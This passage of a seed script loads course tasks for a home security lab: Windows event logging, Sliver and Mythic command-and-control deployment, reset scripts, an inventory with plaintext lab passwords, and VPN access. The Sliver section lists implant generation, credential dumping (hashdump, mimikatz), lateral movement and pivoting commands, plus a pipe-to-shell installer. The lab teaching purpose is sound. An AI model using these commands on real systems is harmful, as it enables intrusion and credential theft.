### Configure pfSense Logging to ELK
\`\`\`
In pfSense WebGUI:

Status > System Logs > Settings

Remote Logging Options:
  Enable Remote Logging: ✓
  Source Address: Any
  IP Protocol: IPv4
  Remote log servers: 10.10.10.x:5514  (your ELK server)
  Remote Syslog Contents: Everything
\`\`\`

### Access Kibana
\`\`\`
1. Open http://<elk-server>:5601
2. Stack Management > Index Patterns
3. Create pattern: filebeat-* and winlogbeat-*
4. Discover tab to view logs
5. Dashboard > Create for visualizations
\`\`\``, 0, now);

insertTask.run(mod3.lastInsertRowid, 'Configure Windows event forwarding', 'Deploy Winlogbeat agents on Windows hosts to ship Security, System, and Sysmon event logs to Elasticsearch, enabling centralized log analysis and SIEM alerting for detecting adversary techniques', `## Windows Event Logging to ELK

### Install Winlogbeat
\`\`\`powershell
# Download Winlogbeat (run on each Windows host)
\$version = "8.11.0"
Invoke-WebRequest -Uri "https://artifacts.elastic.co/downloads/beats/winlogbeat/winlogbeat-\$version-windows-x86_64.zip" -OutFile winlogbeat.zip

Expand-Archive winlogbeat.zip -DestinationPath "C:\\Program Files"
Rename-Item "C:\\Program Files\\winlogbeat-\$version-windows-x86_64" "C:\\Program Files\\Winlogbeat"

cd "C:\\Program Files\\Winlogbeat"
\`\`\`

### Winlogbeat Configuration
\`\`\`yaml
# C:\\Program Files\\Winlogbeat\\winlogbeat.yml

winlogbeat.event_logs:
  # Security events (logons, privilege use, etc)
  - name: Security
    event_id: 4624, 4625, 4648, 4672, 4688, 4689, 4720, 4726, 4728, 4732, 4756, 4768, 4769, 4771, 4776

  # System events
  - name: System
    event_id: 7045, 7040

  # PowerShell
  - name: Microsoft-Windows-PowerShell/Operational
    event_id: 4103, 4104

  # Sysmon (if installed)
  - name: Microsoft-Windows-Sysmon/Operational

# Add hostname to events
processors:
  - add_host_metadata:
      when.not.contains.tags: forwarded

output.logstash:
  hosts: ["10.10.10.x:5044"]  # Your ELK server

# Optional: Enable modules
setup.template.settings:
  index.number_of_shards: 1
\`\`\`

### Install as Service
\`\`\`powershell
# Install and start service
.\\install-service-winlogbeat.ps1
Start-Service winlogbeat

# Verify
Get-Service winlogbeat
\`\`\`

### Key Windows Event IDs to Monitor
\`\`\`
Authentication:
  4624 - Successful logon
  4625 - Failed logon
  4648 - Explicit credential logon
  4672 - Special privileges assigned
  4776 - Credential validation

Account Management:
  4720 - Account created
  4726 - Account deleted
  4728 - Member added to global group
  4732 - Member added to local group

Process Execution:
  4688 - Process created (need audit policy)
  1 (Sysmon) - Process creation with hashes

Lateral Movement:
  4648 - Explicit credentials (runas, psexec)
  4624 Type 3 - Network logon
  4624 Type 10 - RemoteInteractive (RDP)

Kerberos:
  4768 - TGT requested
  4769 - Service ticket requested
  4771 - Pre-auth failed

Persistence:
  7045 - Service installed
  4698 - Scheduled task created
\`\`\`

### Enable Advanced Audit Policy
\`\`\`powershell
# Run on each Windows target to enable detailed logging

# Process creation with command line
auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable
reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f

# Logon events
auditpol /set /subcategory:"Logon" /success:enable /failure:enable

# Credential validation
auditpol /set /subcategory:"Credential Validation" /success:enable /failure:enable

# PowerShell logging
reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 1 /f
reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" /v EnableModuleLogging /t REG_DWORD /d 1 /f
\`\`\`

### Install Sysmon for Enhanced Logging
\`\`\`powershell
# Download Sysmon
Invoke-WebRequest -Uri "https://download.sysinternals.com/files/Sysmon.zip" -OutFile Sysmon.zip
Expand-Archive Sysmon.zip -DestinationPath C:\\Tools\\Sysmon

# Download SwiftOnSecurity config
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml" -OutFile C:\\Tools\\Sysmon\\sysmonconfig.xml

# Install with config
cd C:\\Tools\\Sysmon
.\\Sysmon64.exe -accepteula -i sysmonconfig.xml

# Verify
Get-Service Sysmon64
\`\`\``, 1, now);

// Module 4: C2 Framework Setup
const mod4 = insertModule.run(labPath.lastInsertRowid, 'C2 Framework Deployment', 'Set up command and control infrastructure for practice', 3, now);

insertTask.run(mod4.lastInsertRowid, 'Deploy Sliver C2 framework', 'Install and configure Sliver C2 server, generate implants for multiple platforms, set up HTTP/S and mTLS listeners, and practice operator workflows including pivoting, port forwarding, and post-exploitation modules', `## Sliver C2 Framework Setup

### Why Sliver?
\`\`\`
- Open source, actively maintained
- Written in Go, cross-platform
- HTTP, HTTPS, DNS, mTLS, WireGuard transports
- In-memory .NET execution
- Built-in proxy pivoting
- Good alternative to Cobalt Strike for learning
\`\`\`

### Installation
\`\`\`bash
# On your C2 server (10.20.20.20)

# One-liner install
curl https://sliver.sh/install | sudo bash

# Or manual install
wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux
chmod +x sliver-server_linux
sudo mv sliver-server_linux /usr/local/bin/sliver-server

# Start server
sliver-server

# In another terminal, connect as operator
sliver
\`\`\`

### Generate Implants
\`\`\`bash
# Inside Sliver console

# Generate HTTP implant for Windows
generate --http 10.20.20.20 --os windows --arch amd64 --save /tmp/implants/

# Generate HTTPS implant
generate --http 10.20.20.20 --os windows --format exe --save /tmp/implants/http_win.exe

# Generate Linux implant
generate --http 10.20.20.20 --os linux --arch amd64 --save /tmp/implants/http_linux

# Generate shellcode for injection
generate --http 10.20.20.20 --os windows --format shellcode --save /tmp/implants/shellcode.bin

# Generate beacon (slower, stealthier)
generate beacon --http 10.20.20.20 --os windows --save /tmp/implants/beacon.exe
\`\`\`

### Start Listeners
\`\`\`bash
# HTTP listener
http -l 80

# HTTPS listener (auto-generates cert)
https -l 443

# DNS listener
dns -d c2.hacklab.local

# List listeners
jobs

# Kill a listener
jobs -k <job_id>
\`\`\`

### Basic Operations
\`\`\`bash
# List sessions
sessions

# Interact with session
use <session_id>

# Basic commands (in session)
info           # Session info
pwd            # Current directory
ls             # List files
cd <dir>       # Change directory
cat <file>     # Read file
download <file> # Download file
upload <local> <remote>  # Upload file

# Execution
execute -o whoami
shell          # Interactive shell (noisy)
powershell -e "Get-Process"

# Privilege escalation
getsystem      # Try known techniques
getprivs       # List privileges

# Credential access
hashdump       # Dump SAM hashes
mimikatz       # Run mimikatz

# Lateral movement
psexec <host> <implant>
wmi <host> <implant>

# Pivoting
pivots tcp
portfwd add --remote 10.30.30.100:3389 --bind 127.0.0.1:3389
socks5 start
\`\`\`

### Ansible Deployment
\`\`\`yaml
# playbooks/attack/c2.yml
---
- name: Deploy Sliver C2
  hosts: c2-server
  become: yes

  tasks:
    - name: Download Sliver
      get_url:
        url: https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux
        dest: /usr/local/bin/sliver-server
        mode: '0755'

    - name: Create Sliver directories
      file:
        path: "{{ item }}"
        state: directory
      loop:
        - /opt/sliver
        - /opt/sliver/implants
        - /opt/sliver/logs

    - name: Create systemd service
      copy:
        dest: /etc/systemd/system/sliver.service
        content: |
          [Unit]
          Description=Sliver C2 Server
          After=network.target

          [Service]
          Type=simple
          ExecStart=/usr/local/bin/sliver-server daemon
          Restart=on-failure
          WorkingDirectory=/opt/sliver

          [Install]
          WantedBy=multi-user.target

    - name: Start Sliver service
      systemd:
        name: sliver
        state: started
        enabled: yes
        daemon_reload: yes

    - name: Generate operator config
      shell: |
        sliver-server operator --name operator --lhost 10.20.20.20 --save /opt/sliver/operator.cfg
      args:
        creates: /opt/sliver/operator.cfg
\`\`\``, 0, now);

insertTask.run(mod4.lastInsertRowid, 'Deploy Mythic C2 framework', 'Install and configure the Mythic C2 platform with agent deployment, listener setup, payload generation, and operator workflow to practice modern command and control techniques in a lab environment', `## Mythic C2 Framework Setup

### Why Mythic?
\`\`\`
- Modern, modular C2 framework
- Web UI for management
- Multiple agent types (Apollo, Medusa, etc.)
- Extensive logging for blue team practice
- Docker-based deployment
\`\`\`

### Installation
\`\`\`bash
# Clone Mythic
git clone https://github.com/its-a-feature/Mythic.git
cd Mythic

# Install Docker if needed
sudo ./install_docker_ubuntu.sh

# Start Mythic
sudo ./mythic-cli start

# Get randomly generated password
sudo ./mythic-cli config get MYTHIC_ADMIN_PASSWORD

# Access: https://<ip>:7443
# User: mythic_admin
\`\`\`

### Install Agents
\`\`\`bash
# Install Apollo agent (Windows)
sudo ./mythic-cli install github https://github.com/MythicAgents/apollo

# Install Medusa agent (Python, cross-platform)
sudo ./mythic-cli install github https://github.com/MythicAgents/Medusa

# Install C2 profiles
sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http
sudo ./mythic-cli install github https://github.com/MythicC2Profiles/websocket

# Restart after installing
sudo ./mythic-cli start
\`\`\`

### Create Payloads (Web UI)
\`\`\`
1. Login to https://<ip>:7443
2. Payloads > Create Payload
3. Select Agent: Apollo
4. Select C2 Profile: HTTP
5. Configure:
   - Callback Host: 10.20.20.20
   - Callback Port: 80
   - Callback Interval: 10
6. Build > Download
\`\`\`

### Mythic Operations
\`\`\`
Callbacks Tab:
  - View active implants
  - Interact with sessions
  - Task queue management

Commands (Apollo agent):
  shell <cmd>       - Run shell command
  upload            - Upload file
  download          - Download file
  ps                - List processes
  inject            - Inject shellcode
  mimikatz          - Credential harvesting
  portscan          - Network scanning
  socks             - SOCKS proxy

Operations Tab:
  - View all operator actions
  - Perfect for blue team analysis
\`\`\`

### Docker Compose Deployment
\`\`\`yaml
# Managed by Mythic CLI, but here's the structure
# for understanding

services:
  mythic_server:
    image: ghcr.io/its-a-feature/mythic_server:latest
    ports:
      - "7443:7443"
    environment:
      - MYTHIC_ADMIN_PASSWORD=\${ADMIN_PASS}
    volumes:
      - ./mythic-data:/mythic

  mythic_postgres:
    image: postgres:14
    volumes:
      - ./postgres-data:/var/lib/postgresql/data

  mythic_rabbitmq:
    image: rabbitmq:3

  # Agent containers added dynamically
\`\`\`

### Ansible Deployment
\`\`\`yaml
# playbooks/attack/mythic.yml
---
- name: Deploy Mythic C2
  hosts: c2-server
  become: yes

  tasks:
    - name: Install prerequisites
      apt:
        name:
          - docker.io
          - docker-compose
          - git
        state: present

    - name: Clone Mythic
      git:
        repo: https://github.com/its-a-feature/Mythic.git
        dest: /opt/mythic
        force: yes

    - name: Start Mythic
      shell: |
        cd /opt/mythic
        ./mythic-cli start
      args:
        creates: /opt/mythic/.started

    - name: Install Apollo agent
      shell: |
        cd /opt/mythic
        ./mythic-cli install github https://github.com/MythicAgents/apollo
      ignore_errors: yes

    - name: Install HTTP C2 profile
      shell: |
        cd /opt/mythic
        ./mythic-cli install github https://github.com/MythicC2Profiles/http
      ignore_errors: yes

    - name: Get admin password
      shell: |
        cd /opt/mythic
        ./mythic-cli config get MYTHIC_ADMIN_PASSWORD
      register: mythic_password

    - name: Display credentials
      debug:
        msg: |
          Mythic deployed!
          URL: https://10.20.20.20:7443
          User: mythic_admin
          Pass: {{ mythic_password.stdout }}
\`\`\``, 1, now);

// Module 5: Lab Management
const mod5 = insertModule.run(labPath.lastInsertRowid, 'Lab Management Scripts', 'Scripts for resetting, backing up, and managing the lab', 4, now);

insertTask.run(mod5.lastInsertRowid, 'Create lab reset and rebuild scripts', 'Write automation scripts using Ansible or shell to snapshot VMs, restore to baseline states, rebuild compromised systems, and provision fresh lab environments for repeatable security testing scenarios', `## Lab Reset & Management Scripts

### Master Control Script
\`\`\`bash
#!/bin/bash
# /opt/homelab/labctl.sh

set -e

LAB_DIR="/opt/homelab"
BACKUP_DIR="/opt/homelab/backups"
LOG_FILE="/var/log/labctl.log"

log() {
    echo "[\$(date '+%Y-%m-%d %H:%M:%S')] \$1" | tee -a \$LOG_FILE
}

show_menu() {
    echo ""
    echo "╔═══════════════════════════════════════════╗"
    echo "║         HACKLAB CONTROL CENTER            ║"
    echo "╠═══════════════════════════════════════════╣"
    echo "║  1) Start all VMs                         ║"
    echo "║  2) Stop all VMs                          ║"
    echo "║  3) Reset victims to snapshot             ║"
    echo "║  4) Reset AD environment                  ║"
    echo "║  5) Deploy new vulnerable apps            ║"
    echo "║  6) Backup current state                  ║"
    echo "║  7) View lab status                       ║"
    echo "║  8) Rebuild entire lab                    ║"
    echo "║  9) Exit                                  ║"
    echo "╚═══════════════════════════════════════════╝"
    echo ""
    read -p "Select option: " choice
}

start_all() {
    log "Starting all lab VMs..."

    # Start via Proxmox API or qm commands
    for vmid in 100 200 300 301 302 303; do
        qm start \$vmid 2>/dev/null || true
    done

    # Start Docker containers
    cd /opt/vulnerable-apps && docker-compose up -d

    log "All VMs started"
}

stop_all() {
    log "Stopping all lab VMs..."

    for vmid in 100 200 300 301 302 303; do
        qm stop \$vmid 2>/dev/null || true
    done

    cd /opt/vulnerable-apps && docker-compose down

    log "All VMs stopped"
}

reset_victims() {
    log "Resetting victim VMs to clean snapshot..."

    # Define victim VMs
    VICTIMS=(300 301 302 303)
    SNAPSHOT_NAME="clean"

    for vmid in "\${VICTIMS[@]}"; do
        log "Resetting VM \$vmid..."
        qm stop \$vmid 2>/dev/null || true
        sleep 2
        qm rollback \$vmid \$SNAPSHOT_NAME
        qm start \$vmid
    done

    # Reset Docker containers
    log "Resetting Docker vulnerable apps..."
    cd /opt/vulnerable-apps
    docker-compose down -v
    docker-compose up -d

    log "Victim reset complete"
}

reset_ad() {
    log "Resetting Active Directory environment..."

    # DC and workstations
    AD_VMS=(400 401 402)
    SNAPSHOT_NAME="post-vuln-config"

    for vmid in "\${AD_VMS[@]}"; do
        log "Resetting AD VM \$vmid..."
        qm stop \$vmid 2>/dev/null || true
        sleep 5
        qm rollback \$vmid \$SNAPSHOT_NAME
        qm start \$vmid
    done

    log "AD environment reset. Wait 5 mins for DC to initialize."
}

backup_state() {
    TIMESTAMP=\$(date +%Y%m%d_%H%M%S)
    BACKUP_PATH="\$BACKUP_DIR/\$TIMESTAMP"

    log "Creating backup at \$BACKUP_PATH..."
    mkdir -p \$BACKUP_PATH

    # Backup Proxmox configs
    cp -r /etc/pve \$BACKUP_PATH/pve-config

    # Backup Docker volumes
    docker run --rm -v vulnerable-apps_data:/data -v \$BACKUP_PATH:/backup \\
        alpine tar czf /backup/docker-volumes.tar.gz /data

    # Backup Ansible configs
    cp -r /opt/homelab/ansible \$BACKUP_PATH/ansible

    # Backup pfSense config
    scp admin@10.10.10.1:/cf/conf/config.xml \$BACKUP_PATH/pfsense-config.xml 2>/dev/null || true

    log "Backup complete: \$BACKUP_PATH"
}

show_status() {
    echo ""
    echo "=== VM STATUS ==="
    qm list 2>/dev/null || echo "Proxmox not available"

    echo ""
    echo "=== DOCKER CONTAINERS ==="
    docker ps --format "table {{.Names}}\\t{{.Status}}\\t{{.Ports}}"

    echo ""
    echo "=== NETWORK CONNECTIVITY ==="
    echo "pfSense:    \$(ping -c1 -W1 10.10.10.1 &>/dev/null && echo 'UP' || echo 'DOWN')"
    echo "Kali:       \$(ping -c1 -W1 10.20.20.10 &>/dev/null && echo 'UP' || echo 'DOWN')"
    echo "DVWA:       \$(ping -c1 -W1 10.30.30.10 &>/dev/null && echo 'UP' || echo 'DOWN')"
    echo "DC01:       \$(ping -c1 -W1 10.30.30.100 &>/dev/null && echo 'UP' || echo 'DOWN')"

    echo ""
    echo "=== SERVICES ==="
    curl -s http://10.30.30.10 > /dev/null && echo "DVWA: HTTP OK" || echo "DVWA: HTTP FAIL"
    curl -s http://10.30.30.11:3000 > /dev/null && echo "JuiceShop: HTTP OK" || echo "JuiceShop: HTTP FAIL"
}

rebuild_lab() {
    echo "WARNING: This will destroy and rebuild the entire lab!"
    read -p "Are you sure? (type 'REBUILD' to confirm): " confirm

    if [ "\$confirm" != "REBUILD" ]; then
        echo "Aborted."
        return
    fi

    log "Starting full lab rebuild..."

    # Run Ansible site playbook
    cd /opt/homelab/ansible
    ansible-playbook playbooks/site.yml --tags rebuild

    log "Lab rebuild complete"
}

# Main loop
while true; do
    show_menu
    case \$choice in
        1) start_all ;;
        2) stop_all ;;
        3) reset_victims ;;
        4) reset_ad ;;
        5) cd /opt/homelab/ansible && ansible-playbook playbooks/victims/web-apps.yml ;;
        6) backup_state ;;
        7) show_status ;;
        8) rebuild_lab ;;
        9) exit 0 ;;
        *) echo "Invalid option" ;;
    esac
    read -p "Press Enter to continue..."
done
\`\`\`

### Create Clean Snapshots
\`\`\`bash
#!/bin/bash
# create-snapshots.sh

# Create clean snapshots of all VMs after initial setup

SNAPSHOT_NAME="clean"

# Linux victims
for vmid in 300 301 302 303; do
    echo "Creating snapshot for VM \$vmid..."
    qm snapshot \$vmid \$SNAPSHOT_NAME --description "Clean state for reset"
done

# Windows AD
for vmid in 400 401 402; do
    echo "Creating snapshot for VM \$vmid..."
    qm snapshot \$vmid "post-vuln-config" --description "AD with vulnerabilities configured"
done

echo "Snapshots created!"
\`\`\`

### Scheduled Maintenance
\`\`\`bash
# /etc/cron.d/hacklab

# Daily backup at 3 AM
0 3 * * * root /opt/homelab/labctl.sh backup_state >> /var/log/labctl.log 2>&1

# Weekly victim reset on Sunday at 4 AM
0 4 * * 0 root /opt/homelab/labctl.sh reset_victims >> /var/log/labctl.log 2>&1

# Log rotation
0 0 1 * * root find /opt/homelab/backups -mtime +30 -delete
\`\`\``, 0, now);

insertTask.run(mod5.lastInsertRowid, 'Create machine tracking inventory', 'Develop an inventory system documenting lab VMs, network configurations, credentials, installed tools, and machine purposes with version tracking to maintain organized and reproducible lab environments', `## Lab Inventory & Tracking

### Inventory Database
\`\`\`bash
#!/bin/bash
# /opt/homelab/inventory/update-inventory.sh

# Create SQLite inventory database
sqlite3 /opt/homelab/inventory/lab.db << 'EOF'
CREATE TABLE IF NOT EXISTS machines (
    id INTEGER PRIMARY KEY,
    name TEXT NOT NULL,
    ip TEXT,
    type TEXT,  -- vm, container, physical
    network TEXT,  -- management, attack, victim
    os TEXT,
    status TEXT,
    purpose TEXT,
    credentials TEXT,
    notes TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS vulnerabilities (
    id INTEGER PRIMARY KEY,
    machine_id INTEGER,
    vuln_type TEXT,
    description TEXT,
    difficulty TEXT,  -- easy, medium, hard
    solved INTEGER DEFAULT 0,
    FOREIGN KEY (machine_id) REFERENCES machines(id)
);

CREATE TABLE IF NOT EXISTS attack_log (
    id INTEGER PRIMARY KEY,
    machine_id INTEGER,
    technique TEXT,
    success INTEGER,
    notes TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (machine_id) REFERENCES machines(id)
);

-- Insert machines
INSERT OR REPLACE INTO machines (name, ip, type, network, os, purpose, credentials) VALUES
('pfsense', '10.10.10.1', 'vm', 'management', 'FreeBSD', 'Firewall/Router', 'admin:pfsense'),
('kali', '10.20.20.10', 'vm', 'attack', 'Kali Linux', 'Attack box', 'kali:kali'),
('c2-server', '10.20.20.20', 'vm', 'attack', 'Ubuntu', 'C2 infrastructure', 'root:toor'),
('dvwa', '10.30.30.10', 'container', 'victim', 'Linux', 'Web vulns', 'admin:password'),
('juiceshop', '10.30.30.11', 'container', 'victim', 'Linux', 'OWASP vulns', 'N/A'),
('dc01', '10.30.30.100', 'vm', 'victim', 'Windows Server 2022', 'Domain Controller', 'Administrator:P@ssw0rd!'),
('ws01', '10.30.30.101', 'vm', 'victim', 'Windows 11', 'Workstation', 'user:Password123');

-- Insert vulnerabilities
INSERT INTO vulnerabilities (machine_id, vuln_type, description, difficulty) VALUES
(4, 'SQLi', 'SQL Injection in login form', 'easy'),
(4, 'XSS', 'Reflected XSS in search', 'easy'),
(4, 'LFI', 'Local File Inclusion', 'medium'),
(4, 'Command Injection', 'OS command injection', 'medium'),
(5, 'IDOR', 'Insecure Direct Object Reference', 'easy'),
(5, 'XXE', 'XML External Entity', 'medium'),
(6, 'Kerberoasting', 'Service accounts with SPNs', 'medium'),
(6, 'AS-REP Roast', 'Accounts without preauth', 'easy'),
(6, 'ACL Abuse', 'Misconfigured permissions', 'hard');
EOF

echo "Inventory updated!"
\`\`\`

### Inventory Query Script
\`\`\`bash
#!/bin/bash
# /opt/homelab/inventory/query.sh

DB="/opt/homelab/inventory/lab.db"

case "\$1" in
    list)
        sqlite3 -header -column \$DB "SELECT name, ip, network, os, purpose FROM machines ORDER BY network, name;"
        ;;
    vulns)
        sqlite3 -header -column \$DB "
            SELECT m.name, v.vuln_type, v.difficulty,
                   CASE v.solved WHEN 1 THEN 'SOLVED' ELSE 'TODO' END as status
            FROM vulnerabilities v
            JOIN machines m ON v.machine_id = m.id
            ORDER BY m.name, v.difficulty;"
        ;;
    creds)
        sqlite3 -header -column \$DB "SELECT name, ip, credentials FROM machines WHERE credentials != 'N/A';"
        ;;
    unsolved)
        sqlite3 -header -column \$DB "
            SELECT m.name, v.vuln_type, v.description, v.difficulty
            FROM vulnerabilities v
            JOIN machines m ON v.machine_id = m.id
            WHERE v.solved = 0
            ORDER BY v.difficulty;"
        ;;
    solve)
        sqlite3 \$DB "UPDATE vulnerabilities SET solved = 1 WHERE id = \$2;"
        echo "Marked vulnerability \$2 as solved!"
        ;;
    *)
        echo "Usage: \$0 {list|vulns|creds|unsolved|solve <id>}"
        ;;
esac
\`\`\`

### Web Dashboard (Optional)
\`\`\`python
#!/usr/bin/env python3
# /opt/homelab/inventory/dashboard.py

from flask import Flask, render_template_string
import sqlite3
import subprocess

app = Flask(__name__)
DB = '/opt/homelab/inventory/lab.db'

@app.route('/')
def dashboard():
    conn = sqlite3.connect(DB)
    conn.row_factory = sqlite3.Row

    machines = conn.execute('SELECT * FROM machines ORDER BY network, name').fetchall()
    vulns = conn.execute('''
        SELECT m.name, v.* FROM vulnerabilities v
        JOIN machines m ON v.machine_id = m.id
        WHERE v.solved = 0
    ''').fetchall()

    # Check machine status
    status = {}
    for m in machines:
        result = subprocess.run(['ping', '-c', '1', '-W', '1', m['ip']],
                              capture_output=True)
        status[m['ip']] = 'UP' if result.returncode == 0 else 'DOWN'

    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>HackLab Dashboard</title>
        <style>
            body { font-family: monospace; background: #1a1a2e; color: #eee; padding: 20px; }
            h1 { color: #00ff41; }
            table { border-collapse: collapse; width: 100%; margin: 20px 0; }
            th, td { border: 1px solid #333; padding: 10px; text-align: left; }
            th { background: #16213e; }
            .up { color: #00ff41; }
            .down { color: #ff0040; }
            .easy { color: #00ff41; }
            .medium { color: #ffc400; }
            .hard { color: #ff0040; }
        </style>
    </head>
    <body>
        <h1>🔒 HackLab Dashboard</h1>

        <h2>Machines</h2>
        <table>
            <tr><th>Name</th><th>IP</th><th>Network</th><th>OS</th><th>Status</th></tr>
            {% for m in machines %}
            <tr>
                <td>{{ m.name }}</td>
                <td>{{ m.ip }}</td>
                <td>{{ m.network }}</td>
                <td>{{ m.os }}</td>
                <td class="{{ 'up' if status[m.ip] == 'UP' else 'down' }}">{{ status[m.ip] }}</td>
            </tr>
            {% endfor %}
        </table>

        <h2>Unsolved Vulnerabilities</h2>
        <table>
            <tr><th>Machine</th><th>Type</th><th>Description</th><th>Difficulty</th></tr>
            {% for v in vulns %}
            <tr>
                <td>{{ v.name }}</td>
                <td>{{ v.vuln_type }}</td>
                <td>{{ v.description }}</td>
                <td class="{{ v.difficulty }}">{{ v.difficulty }}</td>
            </tr>
            {% endfor %}
        </table>
    </body>
    </html>
    ''', machines=machines, vulns=vulns, status=status)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8888)
\`\`\`

### Start Dashboard
\`\`\`bash
# Run dashboard
pip3 install flask
python3 /opt/homelab/inventory/dashboard.py &

# Access at http://10.10.10.x:8888
\`\`\``, 1, now);

insertTask.run(mod5.lastInsertRowid, 'Build VPN for remote lab access', 'Configure WireGuard VPN server on pfSense or a dedicated VM, generate client configurations with key pairs, set up split tunneling for lab network access, and enable secure remote administration of all lab systems', `## WireGuard VPN for Remote Access

### Why WireGuard?
\`\`\`
- Simple, fast, secure
- Easy to configure
- Works through NAT
- Mobile-friendly
\`\`\`

### Server Setup (on pfSense or Kali)
\`\`\`bash
# Install WireGuard
apt install wireguard

# Generate server keys
wg genkey | tee /etc/wireguard/server_private.key | wg pubkey > /etc/wireguard/server_public.key
chmod 600 /etc/wireguard/server_private.key

# Note the keys
cat /etc/wireguard/server_private.key
cat /etc/wireguard/server_public.key
\`\`\`

### Server Configuration
\`\`\`ini
# /etc/wireguard/wg0.conf

[Interface]
PrivateKey = <server_private_key>
Address = 10.100.100.1/24
ListenPort = 51820
PostUp = iptables -A FORWARD -i wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
PostDown = iptables -D FORWARD -i wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE

# Client 1: Laptop
[Peer]
PublicKey = <client1_public_key>
AllowedIPs = 10.100.100.2/32

# Client 2: Phone
[Peer]
PublicKey = <client2_public_key>
AllowedIPs = 10.100.100.3/32
\`\`\`

### Client Setup
\`\`\`bash
# Generate client keys
wg genkey | tee client_private.key | wg pubkey > client_public.key

cat client_private.key
cat client_public.key
\`\`\`

### Client Configuration
\`\`\`ini
# client.conf (use in WireGuard app)

[Interface]
PrivateKey = <client_private_key>
Address = 10.100.100.2/24
DNS = 10.10.10.1

[Peer]
PublicKey = <server_public_key>
Endpoint = <your_home_public_ip>:51820
AllowedIPs = 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
PersistentKeepalive = 25
\`\`\`

### Start WireGuard
\`\`\`bash
# Enable and start
systemctl enable wg-quick@wg0
systemctl start wg-quick@wg0

# Check status
wg show

# View connected clients
wg show wg0
\`\`\`

### pfSense WireGuard Setup
\`\`\`
1. System > Package Manager > Available Packages
2. Search "WireGuard" and install

3. VPN > WireGuard > Tunnels > Add
   - Description: LabVPN
   - Listen Port: 51820
   - Generate keys
   - Interface Addresses: 10.100.100.1/24

4. VPN > WireGuard > Peers > Add
   - Tunnel: tun_wg0
   - Description: Laptop
   - Public Key: <client_public_key>
   - Allowed IPs: 10.100.100.2/32

5. Firewall > Rules > WireGuard
   - Add rule: Pass all from WireGuard net

6. Enable tunnel in VPN > WireGuard > Settings
\`\`\`

### Port Forward on Home Router
\`\`\`
Forward UDP 51820 to your pfSense/WireGuard server

Home Router > Port Forwarding:
  External Port: 51820
  Internal IP: 192.168.1.x (pfSense WAN IP)
  Internal Port: 51820
  Protocol: UDP
\`\`\`

### Ansible WireGuard Deployment
\`\`\`yaml
# playbooks/network/wireguard.yml
---
- name: Deploy WireGuard VPN
  hosts: pfsense
  vars:
    wg_server_port: 51820
    wg_server_address: 10.100.100.1/24

  tasks:
    - name: Install WireGuard
      package:
        name: wireguard
        state: present

    - name: Generate server keys
      shell: |
        wg genkey | tee /etc/wireguard/server_private.key | wg pubkey > /etc/wireguard/server_public.key
      args:
        creates: /etc/wireguard/server_private.key

    - name: Read server private key
      slurp:
        src: /etc/wireguard/server_private.key
      register: server_private_key

    - name: Configure WireGuard
      template:
        src: wg0.conf.j2
        dest: /etc/wireguard/wg0.conf
        mode: '0600'

    - name: Enable WireGuard
      systemd:
        name: wg-quick@wg0
        state: started
        enabled: yes
\`\`\`

### Mobile Access
\`\`\`
1. Install WireGuard app (iOS/Android)
2. Create new tunnel from scratch or import config
3. Paste client configuration
4. Connect!

Now you can:
- Access Kali: ssh kali@10.20.20.10
- Access web apps: http://10.30.30.10
- Access pfSense: https://10.10.10.1
- Run attacks from anywhere!
\`\`\``, 2, now);

console.log('Seeded: Complete Homelab Infrastructure');
console.log('  - 5 modules with full automation scripts');
console.log('');
console.log('Modules:');
console.log('  1. Ansible Lab Automation - Complete playbooks');
console.log('  2. pfSense Firewall Setup - Full configuration');
console.log('  3. Logging & SIEM Setup - ELK stack deployment');
console.log('  4. C2 Framework Deployment - Sliver & Mythic');
console.log('  5. Lab Management Scripts - Reset, backup, VPN');

sqlite.close();
